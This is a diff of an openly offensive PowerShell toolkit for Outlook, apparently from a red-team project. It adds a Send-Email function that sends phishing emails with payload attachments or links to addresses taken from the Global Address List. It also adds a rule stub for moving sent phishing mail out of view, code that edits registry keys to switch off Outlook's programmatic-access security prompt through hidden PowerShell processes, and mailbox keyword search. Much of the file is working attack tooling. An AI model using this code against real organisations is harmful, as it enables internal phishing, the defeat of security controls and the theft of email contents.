@@ -9,9 +9,177 @@ by @xorrior
 
 #>
 
-Function Invoke-Spam {
+Function Send-Email {
     <#
     .SYNOPSIS
+    This function sends emails using a custom or default template to specified target email addresses.
+
+    .DESCRIPTION
+    This function sends a specified number of phishing emails to a random list of email addresses or a specified target list. A payload or URL can be included in the email. The E-Mail will be constructed based on a 
+    template or by specifying the Subject and Body of the email. 
+
+    .PARAMETER Targets
+    Array of target email addresses. If Targets or TargetList parameter are not specified, a list of 100 email addresses will be randomly selected from the Global Address List. 
+
+    .PARAMETER TargetList
+    List of email addresses read from a file. If Targets or TargetList parameter are not specified, a list of 100 email addresses will be randomly selected from the Global Address List.
+
+    .PARAMETER URL
+    URL to include in the email
+
+    .PARAMETER PayloadFile
+    Full path to the file to use as a payload 
+
+    .PARAMETER Template
+    Full path to the template html file
+
+    .PARAMETER Subject
+    Subject of the email
+
+    .PARAMETER Body
+    Body of the email
+
+    .EXAMPLE
+
+    Send-Email -Targets $Emails -URL "http://bigorg.com/projections.xls" -Subject "Hi" -Body "Please check this <a href='URL'>link</a> out!"
+
+    Send phishing email to the array of target email addresses with an embedded url. 
+
+    .EXAMPLE
+
+    Send-Email -TargetList .\Targets.txt -Attachment .\Notice.rtf -Template .\Phish.html
+
+    Send phishing email to the list of addresses from file and include the specified attachment. 
+
+    #>
+
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $False, Position = 0)]
+        [string[]]$Targets,
+
+        [Parameter(Mandatory = $False, Position = 1)]
+        [string]$TargetList,
+
+        [Parameter(Mandatory = $False, Position = 2)]
+        [string]$URL,
+
+        [Parameter(Mandatory = $False, Position = 3)]
+        [string]$Attachment,
+
+        [Parameter(Mandatory = $False, Position = 4)]
+        [String]$Template,
+
+        [Parameter(Mandatory = $False, Position = 5)]
+        [string]$Subject,
+
+        [Parameter(Mandatory = $False, Position = 6)]
+        [String]$Body
+
+    )
+
+
+
+    #check for a target list file or the targets parameter 
+    if($TargetList){
+        if(!(Test-Path $TargetList)){
+            Throw "Not a valid file path for E-Mail TargetList"
+        }
+        $TargetEmails = Get-Content $TargetList
+    }
+    elseif($Targets){
+        $TargetEmails = $Targets
+    }
+    
+    #check if a template is being used 
+    if($Template){
+        if(!(Test-Path $Template)){
+            Throw "Not a valid file path for E-mail template"
+        }
+        $EmailBody = Get-Content -Path $Template
+        $EmailSubject = $Subject
+    }
+    elseif($Subject -and $Body){
+        $EmailSubject = $Subject 
+        $EmailBody = $Body 
+    }
+    else {
+        Throw "No email Subject and/or Body specified"
+    }
+
+    #Check for a url to embed
+    if($URL){
+        $EmailBody = $EmailBody.Replace("URL",$URL)
+    }
+
+    #Read the Outlook signature locally if available 
+    $appdatapath = $env:appdata
+    $sigpath = $appdatapath + "\Microsoft\Signatures\*.htm"
+
+    if(Test-Path $sigpath){
+        $Signature = Get-Content -Path $sigpath
+    }
+
+
+    #Iterate through the list, craft the emails, and then send it off. 
+    ForEach($Target in $TargetEmails){
+
+        $Email = $script:Outlook.CreateItem(0)
+        #If there was an attachment, include it with the email 
+        if($Attachment){
+            $($Email.Attachment).Add($Attachment)
+        }
+        $Email.HTMLBody = "$EmailBody"
+        $Email.Subject = $EmailSubject
+        $Email.To = $Target
+
+        #if there is a signature, add it to the email
+        if($Signature){
+            $Email.HTMLBody += "`n`n$Signature"
+        }
+        $Email.Send()
+
+    }
+   
+}
+
+Function Invoke-SentItemsRule {
+
+    <#
+    .SYNOPSIS
+    This function enables an Outlook rule where all mail items in the sent items folder, that match the specified subject string, will be sent to the deleted items folder
+
+    .PARAMETER Subject
+    The subject string to use in the rule
+
+    #>
+
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $True, Position = 0)]
+        [string]$Subject,
+
+        [Parameter(Mandatory = $True, Position = 1)]
+        [string]$RuleName,
+
+        [Parameter(Mandatory = $False)]
+        [switch]$Disable
+    )
+
+
+    if($Disable){
+
+    }
+    else{
+
+        $SentItemsFolder = Get-OutlookFolder -Name "SentMail"
+        $olRuleType = "Microsoft.Office.Interop.Outlook.OlRuleType" -as [type]
+        $MoveTarget = Get-OutlookFolder -Name "DeletedItems"
+        $rules = (($script:Outlook.session).DefaultStore).GetRules()
+        $rule = $rules.Create("$RuleName",$olRuleType::OlRuleReceive)
+    }
+    
+
 }
 
 
@@ -95,6 +263,7 @@ Function Disable-SecuritySettings{
         [string]$Version
     )
 
+    $count = 0
     $Version = $Version.Substring(0,4)
 
     #Check AV to see if it's up to date. 
@@ -131,86 +300,176 @@ Function Disable-SecuritySettings{
     $PromptOOMSend = "PromptOOMSend"
     $AdminSecurityMode = "AdminSecurityMode" 
 
+    $cmd = " "
+
     if(!(Test-Path $LMSecurityKey)){
         #if the key does not exists, create or update the appropriate reg keys values.
         $cmd = "New-Item $LMSecurityKey -Force;"
-        $cmd += "New-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"
-
-        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
+        $cmd += "New-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"
+       
 
     }
     else{
             
-        if((Get-ItemProperty $LMSecurityKey -Name $ObjectModelGuard).ObjectModelGuard){
-
-            $cmd = "Set-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -Force;" 
+        if((Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard).ObjectModelGuard){
+            #Save the original value 
+            $script:ObjectModelGuardEdited = $True
+            $script:OldObjectModelGuard = (Get-ItemProperty $LMSecurityKey -Name ObjectModelGuard).ObjectModelGuard
+            $cmd = "Set-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -Force;" 
         }
-        else{
-            $cmd = "New-ItemProperty $LMSecurityKey -Name $ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"
+        else{ 
+            $cmd = "New-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value 2 -PropertyType DWORD -Force;"
         }
-
-        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
+    
                 
     }
     if(!(Test-Path $CUSecurityKey)){
 
         $cmd += "New-Item $CUSecurityKey -Force;"
-        $cmd += "New-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -PropertyType DWORD -Force;" 
-        $cmd += "New-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -PropertyType DWORD -Force;"
-
-        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
+        $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force;" 
+        $cmd += "New-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -PropertyType DWORD -Force;"
+      
     }
     else{
-        if((Get-ItemProperty $CUSecurityKey -Name $PromptOOMSend).PromptOOMSend){
-                
-            $cmd += "Set-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -Force;"
+        if((Get-ItemProperty $CUSecurityKey -Name PromptOOMSend).PromptOOMSend){
+            #save the old value  
+            $script:OldPromptOOMSend = (Get-ItemProperty $CUSecurityKey -Name PromptOOMSend).PromptOOMSend
+            $cmd += "Set-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -Force;"
+            $script:PromptOOMSendEdited = $True 
         }
         else{
-            $cmd += "New-ItemProperty $CUSecurityKey -Name $PromptOOMSend -Value 2 -PropertyType DWORD -Force;"
+            $cmd += "New-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value 2 -PropertyType DWORD -Force;" 
         }
 
-        If((Get-ItemProperty $CUSecurityKey -Name $AdminSecurityMode).$AdminSecurityMode){
-            $cmd += "Set-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -Force"
+        If((Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode).AdminSecurityMode){
+            #save the old value 
+            $script:OldAdminSecurityMode = (Get-ItemProperty $CUSecurityKey -Name AdminSecurityMode).AdminSecurityMode
+            $cmd += "Set-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -Force"
+            $script:AdminSecurityModeEdited = $True 
         }
         else{
-            $cmd += "New-ItemProperty $CUSecurityKey -Name $AdminSecurityMode -Value 3 -PropertyType DWORD -Force"
+            $cmd += "New-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value 3 -PropertyType DWORD -Force" 
         }
-            
-        #Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd       
+                  
     }
 
     if($User -and $Password){
 
+        #If creds are given start a new powershell process and run the commands. Unable to use the Credential parameter with 
         $pw = ConvertTo-SecureString $Password -asplaintext -Force
         $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$pw
-        Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd
+        try {
+            Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd -RedirectStandardError "C:\Users\tester\Desktop\errorforadd.txt"
+            $count += 1
+        }
+        catch {
+            Throw "Unable to change registry settings to disable security prompt"
+        }
+        
 
     }
     else{
 
-        Start-Process powershell.exe -WindowStyle hidden -ArgumentList $cmd
+        #Start-Process powershell.exe -WindowStyle hidden -ArgumentList $cmd
+        try {
+            Invoke-Expression $cmd
+            $count += 1
+        }
+        catch {
+            Throw "Unable to change registry settings to disable security prompt"
+        }
     }
     
 
+    if($count -eq 1){
+        $True
+    }
+    elseif($count -eq 0){
+        $False
+    }
+
 }
 
 
-Function Reset-SecuritySettings{}
-
-Function Invoke-Exit{
+Function Reset-SecuritySettings{
     <#
+
     .SYNOPSIS
-    This function destroys the Outlook Com object
+    This function resets all of the registry keys to their original state
+
+    .PARAMETER AdminUser
+    Administrative user
+
+    .PARAMETER AdminPass
+    Password of administrative user
 
     .EXAMPLE
-
-    Invoke-Exit
+    Reset-SecuritySettings
 
     #>
 
-    $script:Outlook.quit()
-    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($script:Outlook)
+    [CmdletBinding()]
+    param()
+
+
+    $Version = $script:Outlook.Version 
+    $Version = $Version.Substring(0,4)
+
+    $LMSecurityKey = "HKLM:\SOFTWARE\Microsoft\Office\$Version\Outlook\Security"
+
+    $CUSecurityKey = "HKCU:\SOFTWARE\Policies\Microsoft\Office\$Version\outlook\security"
+
+        
+        
+    #if the old value exists, that means the registry key was set and not created. 
+    if($($script:ObjectModelGuardEdited)){
+        #If the key was set, change it back to original value
+        $cmd = "Set-ItemProperty $LMSecurityKey -Name ObjectModelGuard -Value $($script:OldObjectModelGuard) -Force;"
+    }
+    else{
+        #if the key was created, remove it.
+        $cmd = "Remove-ItemProperty -Path $LMSecurityKey -Name ObjectModelGuard -Force;"
+    }
+
+    if($script:PromptOOMSendEdited){
+        $cmd += "Set-ItemProperty $CUSecurityKey -Name PromptOOMSend -Value $($script:OldPromptOOMSend) -Force;" 
+    }
+    else {
+        $cmd += "Remove-ItemProperty -Path $CUSecurityKey -Name PromptOOMSend -Force;"
+    }
+
+    if($script:AdminSecurityModeEdited){
+        $cmd += "Set-ItemProperty $CUSecurityKey -Name AdminSecurityMode -Value $($script:OldAdminSecurityMode) -Force"
+    }
+    else {
+        $cmd += "Remove-ItemProperty -Path $CUSecurityKey -Name AdminSecurityMode -Force"
+    }
+
+    if($script:DisableUser -and $script:DisablePass){
+
+        $pw = ConvertTo-SecureString $script:DisablePass -asplaintext -Force
+        $creds = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $script:DisableUser,$pw
+
+        try {
+            Start-Process powershell.exe -WindowStyle hidden -Credential $creds -ArgumentList $cmd -RedirectStandardError "C:\Users\tester\Desktop\errorforremove.txt"
+        }
+        catch {
+            Throw "Unable to reset registry keys"
+        }
+    }
+    else {
+        try {
+            Invoke-Expression $cmd
+        }
+        catch {
+            Throw "Unable to reset registry keys"
+        }
+    }
+
+
+
 }
+
 
 Function Get-OutlookFolder{
     <#
@@ -397,14 +656,20 @@ Function Invoke-MailSearch{
 
         ForEach($word in $Keywords){
             if(($MailItem.Subject -match $Keyword) -or ($MailItem.Body -match $Keyword)){
-            $Email = New-Object PSObject -Property @{
-                To = $MailItem.To
-                FromName = $MailItem.SenderName 
-                FromAddress = $MailItem.SenderEmailAddress
-                Subject = $MailItem.Subject
-                Body = $MailItem.Body
-                TimeSent = $MailItem.SentOn
-                TimeReceived = $MailItem.ReceivedTime
+                <#
+                $Email = New-Object PSObject -Property @{
+                    To = $MailItem.To
+                    FromName = $MailItem.SenderName 
+                    FromAddress = $MailItem.SenderEmailAddress
+                    Subject = $MailItem.Subject
+                    Body = $MailItem.Body
+                    TimeSent = $MailItem.SentOn
+                    TimeReceived = $MailItem.ReceivedTime
+                }
+                #>
+                #Creating the custom object is too slow
+
+                $Email = $MailItem
             }
         
         }
@@ -509,14 +774,14 @@ Function Invoke-MailSearch{
 
        $Results = $Results | Select-Object -First $MaxResults
        $Results | ForEach-Object {
-            $_ 
+            $_  | Select-Object SenderEmailAddress, Subject, Body, SentOn | Format-List  
             Write-Host "`n"
        }
  
     }
     else{
         $Results | ForEach-Object {
-            $_
+            $_  | Select-Object SenderEmailAddress, Subject, Body, SentOn | Format-List 
             Write-Host "`n"
         }
     }
@@ -600,32 +865,35 @@ Function Get-SMTPAddress{
     [CmdletBinding()]
     Param(
         [string[]]
-        $FullName
+        $FullNames
     )
 
     #Grab the GAL 
     $GAL = Get-GlobalAddressList
-    #If the full name is given, try to obtain the exchange user object 
-    If($FullName){
-        try{
-            $User = $GAL | Where-Object {$_.Name -eq $FullName}
+    #If the full name is given, try to obtain the exchange user object
+
+    $PrimarySMTPAddresses = @() 
+    If($FullNames){
+        ForEach($Name in $FullNames){
+            try{
+                $User = $GAL | Where-Object {$_.Name -eq $Name}
+            }
+            catch {
+                Write-Warning "Unable to obtain exchange user object with the name: $Name"
+            }
+            $PrimarySMTPAddresses += $($User.GetExchangeuser()).PrimarySMTPAddress
         }
-        catch {
-            Throw "Unable to obtain exchange user object with the name: $FullName"
-            break
-        }
-        $PrimarySMTPAddress = ($User.GetExchangeuser()).PrimarySMTPAddress
     }
     else{
         try {
-            $PrimarySMTPAddress = (((($script:MAPI.CurrentUser).Session).CurrentUser).AddressEntry.GetExchangeuser()).PrimarySmtpAddress
+            $PrimarySMTPAddresses = (((($script:MAPI.CurrentUser).Session).CurrentUser).AddressEntry.GetExchangeuser()).PrimarySmtpAddress
         }
         catch{
             Throw "Unable to obtain primary smtp address for the current user"
         }
     }
 
-    $PrimarySMTPAddress
+    $PrimarySMTPAddresses
 
 }
 
@@ -673,7 +941,7 @@ Function Get-OutlookInstance{
     else{
         #Start an Outlook instance
         try {
-            $script:Outlook = New-Object -ComObject Outlook.Application   
+            $script:Outlook = New-Object -ComObject "Outlook.Application"   
         }
         catch {
             Throw "Unable to create Outlook com object"
@@ -683,14 +951,24 @@ Function Get-OutlookInstance{
     $OV = $script:Outlook.Version
     
     if($AdminUser -and $AdminPass){
-        Disable-SecuritySettings -User $AdminUser -Password $AdminPass -Version $OV
+        $result = Disable-SecuritySettings -User $AdminUser -Password $AdminPass -Version $OV
         Write-Verbose "Security Prompt should be disabled"
+        $script:DisableUser = $AdminUser
+        $script:DisablePass = $AdminPass
     }
     else{
-        Disable-SecuritySettings -Version $OV 
-        Write-Verbose "Security Prompt should be disabled"
+        $result = Disable-SecuritySettings -Version $OV 
     }
-    $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
+
+    if($result){
+        Write-Verbose "Programmatic access prompt has been disabled"
+        $Script:MAPI = $script:Outlook.GetNamespace('MAPI')
+    }
+    else{
+        Write-Warning "Programmitic access prompt has not been disabled"
+    }
+
+    #$Script:MAPI = $script:Outlook.GetNamespace('MAPI')
     #Namespace.Logon method is unnecessary if we are using the default profile 
     #$script:MAPI.Logon("", "", $NULL, $NULL)
     
